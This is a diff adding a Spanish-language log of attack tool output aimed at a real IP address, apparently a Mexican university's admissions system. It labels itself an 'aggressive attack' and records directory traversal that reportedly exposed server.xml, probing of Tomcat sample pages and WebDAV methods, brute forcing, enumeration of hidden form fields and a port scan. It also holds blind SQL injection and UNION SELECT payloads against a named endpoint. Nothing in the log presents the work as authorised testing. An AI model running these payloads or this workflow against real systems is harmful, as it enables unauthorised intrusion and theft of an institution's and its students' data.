@@ -1,0 +1,118 @@
+Ataque Directo y Agresivo:
+
+=== ATAQUE AGRESIVO TOMCAT 6.0.53 ===
+Objetivo: http://189.254.143.102
+
+[+] Ataque agresivo de Directory Traversal...
+[CRITICAL] server.xml EXPUESTO!
+[+] Archivo guardado como: server.xml
+[-] Directory Traversal no exitoso con métodos convencionales
+
+[+] Accediendo a JSP samples directamente...
+[+] JSP Sample accesible: /examples/jsp/jsp2/tagfiles/hello.jsp
+[+] JSP Sample accesible: /examples/jsp/include/include.jsp
+[+] JSP Sample accesible: /examples/jsp/snp/snoop.jsp
+   SnoopJSP - Puede mostrar información del servidor
+   Contiene información del servidor
+
+[+] Fuerza bruta ampliada...
+ FALLADA
+
+[+] Probando métodos WebDAV...
+WebDAV PUT: HTTP 200
+WebDAV DELETE: HTTP 200
+WebDAV PROPFIND: HTTP 200
+WebDAV MKCOL: HTTP 200
+WebDAV COPY: HTTP 200
+WebDAV MOVE: HTTP 200
+
+Enumeración Detallada de la Aplicación SITO:
+
+=== ENUMERACIÓN DETALLADA APLICACIÓN SITO ===
+Objetivo: http://189.254.143.102
+
+[1] Analizando página principal...
+✅ Página principal accesible: 1750 bytes
+📎 Enlaces encontrados: 5
+📜 Scripts encontrados: 2
+📋 Formularios encontrados: 1
+
+🔍 Enlaces interesantes:
+   cerrar_sesion.jsp
+
+📋 Formularios encontrados:
+   Action:
+
+[2] Buscando archivos y directorios comunes...
+
+[3] Enumerando rutas JSP...
+✅ JSP accesible: /jsp/escolar/proceso_admision/proceso_interesado.jsp (38586 bytes)
+✅ JSP accesible: /jsp/cerrar_sesion.jsp (1808 bytes)
+
+[4] Analizando archivos JavaScript...
+
+📜 Analizando: /javascript/utilities.js
+
+📜 Analizando: /javascript/jquery/jquery-1.5.1.min.js
+
+📜 Analizando: /javascript/jquery/jquery-ui-1.8.2.min.js
+   🔍 Credenciales de BD:
+      ('host', 'string')
+   🔍 Configuraciones:
+      ('host', 'string')
+
+📜 Analizando: /javascript/scriptAnimaciones.js
+
+[5] Buscando parámetros ocultos...
+
+[5] Buscando parámetros ocultos en formularios...
+
+📋 Parámetros ocultos en /jsp/escolar/proceso_admision/proceso_interesado.jsp:
+   🔒 yAccion =
+   🔒 yInteresado = 0
+   🔒 yEncuestado = 0
+   🔒 yCveTipoSeguroOtro = 10
+   🔒 yResolucion = 800x600
+   🔒 ySexo = M
+   🔒 yObjeto = N/A
+   🔒 yScroll =
+   🔒 yBloqueoG = true
+   🔒 yMenorEdad = 1
+
+============================================================
+REPORTE FINAL DE ENUMERACIÓN
+============================================================
+
+✅ Enumeración completada
+📊 Revisa los archivos guardados para más detalles
+
+Ataque Directo a Base de Datos via SQL Injection:
+
+[+] Probando SQL Injection ciega...
+Error: HTTPSConnectionPool(host='189.254.143.102', port=443): Max retries exceeded with url: /jsp/escolar/proceso_admision/muestra_bachillerato_ajax.jsp?xCveBachillerato=1 (Caused by SSLError(CertificateError("hostname '189.254.143.102' doesn't match either of '*.utslp.edu.mx', 'utslp.edu.mx'")))
+Error: HTTPSConnectionPool(host='189.254.143.102', port=443): Max retries exceeded with url: /jsp/escolar/proceso_admision/muestra_bachillerato_ajax.jsp?xCveBachillerato=1' (Caused by SSLError(CertificateError("hostname '189.254.143.102' doesn't match either of '*.utslp.edu.mx', 'utslp.edu.mx'")))
+Error: HTTPSConnectionPool(host='189.254.143.102', port=443): Max retries exceeded with url: /jsp/escolar/proceso_admision/muestra_bachillerato_ajax.jsp?xCveBachillerato=1'%20AND%20'1'='1 (Caused by SSLError(CertificateError("hostname '189.254.143.102' doesn't match either of '*.utslp.edu.mx', 'utslp.edu.mx'")))
+Error: HTTPSConnectionPool(host='189.254.143.102', port=443): Max retries exceeded with url: /jsp/escolar/proceso_admision/muestra_bachillerato_ajax.jsp?xCveBachillerato=1'%20AND%20'1'='2 (Caused by SSLError(CertificateError("hostname '189.254.143.102' doesn't match either of '*.utslp.edu.mx', 'utslp.edu.mx'")))
+Error: HTTPSConnectionPool(host='189.254.143.102', port=443): Max retries exceeded with url: /jsp/escolar/proceso_admision/muestra_bachillerato_ajax.jsp?xCveBachillerato=1'%20OR%20'1'='1'--%20 (Caused by SSLError(CertificateError("hostname '189.254.143.102' doesn't match either of '*.utslp.edu.mx', 'utslp.edu.mx'")))
+Error: HTTPSConnectionPool(host='189.254.143.102', port=443): Max retries exceeded with url: /jsp/escolar/proceso_admision/muestra_bachillerato_ajax.jsp?xCveBachillerato=1'%20UNION%20SELECT%201,2,3--%20 (Caused by SSLError(CertificateError("hostname '189.254.143.102' doesn't match either of '*.utslp.edu.mx', 'utslp.edu.mx'")))
+
+[+] Extrayendo información de BD...
+Error: HTTPSConnectionPool(host='189.254.143.102', port=443): Max retries exceeded with url: /jsp/escolar/proceso_admision/muestra_bachillerato_ajax.jsp?xCveBachillerato=1'%20UNION%20SELECT%20@@version,@@hostname,user()--%20 (Caused by SSLError(CertificateError("hostname '189.254.143.102' doesn't match either of '*.utslp.edu.mx', 'utslp.edu.mx'")))
+Error: HTTPSConnectionPool(host='189.254.143.102', port=443): Max retries exceeded with url: /jsp/escolar/proceso_admision/muestra_bachillerato_ajax.jsp?xCveBachillerato=1'%20UNION%20SELECT%20database(),schema_name,3%20FROM%20information_schema.schemata--%20 (Caused by SSLError(CertificateError("hostname '189.254.143.102' doesn't match either of '*.utslp.edu.mx', 'utslp.edu.mx'")))
+Error: HTTPSConnectionPool(host='189.254.143.102', port=443): Max retries exceeded with url: /jsp/escolar/proceso_admision/muestra_bachillerato_ajax.jsp?xCveBachillerato=1'%20UNION%20SELECT%20table_name,table_schema,3%20FROM%20information_schema.tables%20WHERE%20table_schema=database()--%20 (Caused by SSLError(CertificateError("hostname '189.254.143.102' doesn't match either of '*.utslp.edu.mx', 'utslp.edu.mx'")))
+
+Scanner de Puertos y Servicios Específico:
+
+[+] Escaneando puertos en 189.254.143.102...
+Puerto 80: ABIERTO
+  Error obteniendo banner: HTTPSConnectionPool(host='189.254.143.102', port=443): Max retries exceeded with url: / (Caused by SSLError(CertificateError("hostname '189.254.143.102' doesn't match either of '*.utslp.edu.mx', 'utslp.edu.mx'")))
+Puerto 443: ABIERTO
+Puerto 8080: ABIERTO
+  Error obteniendo banner: HTTPConnectionPool(host='189.254.143.102', port=8080): Read timed out. (read timeout=5)
+Puerto 8009: ABIERTO
+Puerto 8005: ABIERTO
+Puerto 8443: ABIERTO
+Puerto 8081: ABIERTO
+Puerto 8090: ABIERTO
+Puerto 8088: ABIERTO
+Puerto 8888: ABIERTO
